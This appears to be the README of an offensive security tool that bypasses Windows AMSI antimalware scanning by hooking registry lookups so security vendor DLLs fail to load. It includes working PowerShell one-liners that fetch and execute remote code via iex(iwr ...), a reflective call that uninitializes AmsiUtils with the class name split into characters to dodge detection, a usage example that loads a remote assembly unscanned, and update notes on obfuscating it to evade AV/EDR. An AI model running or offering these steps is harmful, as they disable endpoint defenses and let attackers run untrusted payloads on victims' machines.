## UPDATES
```diff
! UPDATE 06/07/2025
! Added win11 folder
! PS: This still works for many AV/EDR, the technique is not flagged just the static compiled file. So just obfuscate it and it works lol
```
```diff
! UPDATE 26/05/2025
! Added a counter for the .cs/.ps1 files so that after it has completed the redirection of "Software\Microsoft\AMSI\Providers", it will unhook RegOpenKeyExW
! This is to remove the overhead introduced by hooking every RegOpenKeyExW call and causing problems when RegOpenKeyExW is legitimately invoked
! For the powershell reflective loading and .ps1 script, MAKE SURE the process has fully loaded, can run some arbitrary commands first..
```
```diff
! UPDATE 02/06/2025
! "Software\Microsoft\AMSI\Providers" is being detected, code for TrollDisappearKey.cs altered to pass it in as argument as instead
```

# TrollDisappearKey
<br>
<b>bypass clr amsi</b> <br>
TrollDisappearKey.cs   -> compile into a .exe that can load .exe assemblies without amsi scanning taking place during assembly.load() <br>
<br>
<b>bypass powershell amsi</b> <br>
TrollDisappearKeyPS.cs -> compile into a .dll to reflectively load <br>
TrollDisappearKeyPS.ps1 -> copy paste into powershell (most likely to get flagged)

# How does it work?
Upon assembly.load(), internals of amsi/clr will search for reg key "Software\Microsoft\AMSI\Providers" to load the relevant provider dlls (i.e security vendor dlls) 
We hook the reg query function and when amsi/clr tries to read "Software\Microsoft\AMSI\Providers" we overwrite its value to "Software\Microsoft\AMSI\Providers "  <- note the space after providers
This breaks the provider dlls loading process and we are able to assembly load any .net assembly we want. For the powershell amsi, its somewhat similar, we break the vendor dll loading and call uninitialize to trigger a reinitialize. 


## .exe Usage (does not require admin) 
![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)
![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)

```
TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2> <KEY>
```
## Example
```
TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders" "Software\Microsoft\AMSI\Providers"
```

## .powershell Usage (does not require admin)

```
##For PS Script
iex(iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.ps1 -UseBasicParsing).content

##For PS dll reflective after dl to disk
$code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/refs/heads/main/TrollDisappearKeyPS.cs -UseBasicParsing).content
Add-Type $code
[TrollDisappearKeyPS]::DisappearKey()
([Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")).GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize).Invoke($object,$null)
```

## Features
Nothing actually, its quite barebone with short code profile so anyone can tweak it to their needs  (e.g tweak the code to load .dll assemblies instead of just .exe assemblies)

## Disclaimer
Should only be used for educational purposes!







